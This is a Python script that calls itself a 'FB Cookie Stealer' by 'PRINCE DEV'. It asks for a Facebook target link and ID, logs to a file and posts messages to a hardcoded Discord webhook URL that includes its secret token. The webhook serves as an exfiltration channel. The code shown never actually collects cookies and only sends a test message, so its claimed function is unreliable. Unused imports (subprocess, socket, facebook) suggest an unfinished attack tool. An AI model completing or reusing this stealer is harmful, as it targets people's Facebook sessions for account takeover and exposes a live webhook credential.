import requests
import os
import time
import subprocess
import logging
import facebook
import random
import socket

class colors:
    indigo = "\033[1;35m"
    cyan = "\033[1;36m"

print(colors.indigo + """
 ██████╗ ██████╗  ██████╗ ██╗  ██╗██╗███████╗     ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗ 
██╔════╝██╔═══██╗██╔═══██╗██║ ██╔╝██║██╔════╝    ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗
██║     ██║   ██║██║   ██║█████╔╝ ██║█████╗      ██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝
██║     ██║   ██║██║   ██║██╔═██╗ ██║██╔══╝      ██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗
╚██████╗╚██████╔╝╚██████╔╝██║  ██╗██║███████╗    ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║
 ╚═════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚═╝╚══════╝     ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝""")
print(colors.cyan + u'\033[40m' + """
            ▄▄▄▄
          ▄██████     ▄▄▄█▄
        ▄██▀░░▀██▄    ████████▄
       ███░░░░░░██     █▀▀▀▀▀██▄▄
     ▄██▌░░░░░░░██    ▐▌       ▀█▄
     ███░░▐█░█▌░██    █▌         ▀▌
    ████░▐█▌░▐█▌██   ██
   ▐████░▐░░░░░▌██   █▌
    ████░░░▄█░░░██  ▐█
    ████░░░██░░██▌  █▌
    ████▌░▐█░░███   █
    ▐████░░▌░███   ██
     ████░░░███    █▌
   ██████▌░████   ██
 ▐████████████   ███
 █████████████▄████
██████████████████
██████████████████
█████████████████▀
█████████████████
████████████████
████████████████


 """)
print("[+]A FB Cookie Stealer Created By PRINCE DEV[+]")

# Define the webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1231246184270790727/KooH3mSQFlq7iM9pla779MHZYIzc8UI6YEryaPbLEMOg-x9jj93LpyFWhDkqyiHn9g6G"

class FacebookLogger:
    def __init__(self, target_link, target_id):
        self.target_link = target_link
        self.target_id = target_id
        self.logger = logging.getLogger('facebook_logger')
        self.logger.setLevel(logging.DEBUG)
        formatter = logging.Formatter('%(asctime)s - %(levelname)s - %(message)s')

        # Create a file handler
        file_handler = logging.FileHandler('facebook.log')
        file_handler.setLevel(logging.DEBUG)
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)

    def log_message(self, message):
        # Log the message
        self.logger.debug(message)
        # Send message to Discord webhook
        send_discord_message(message)

def send_discord_message(message):
    # Create payload
    payload = {
        "content": message
    }
    # Send POST request to webhook URL
    response = requests.post(WEBHOOK_URL, json=payload)
    if response.status_code == 204:
        print("Message sent successfully to Discord channel!")
    else:
        print(f"Failed to send message to Discord")

# Prompt user to input Facebook target link and ID
fb_link = input("Enter the Facebook target link: ")
fb_id = input("Enter the Facebook target ID: ")

# Now you can use fb_link and fb_id in your code

# Create FacebookLogger instance
fb_logger = FacebookLogger(fb_link, fb_id)

# Log a test message
fb_logger.log_message("This is a test log message")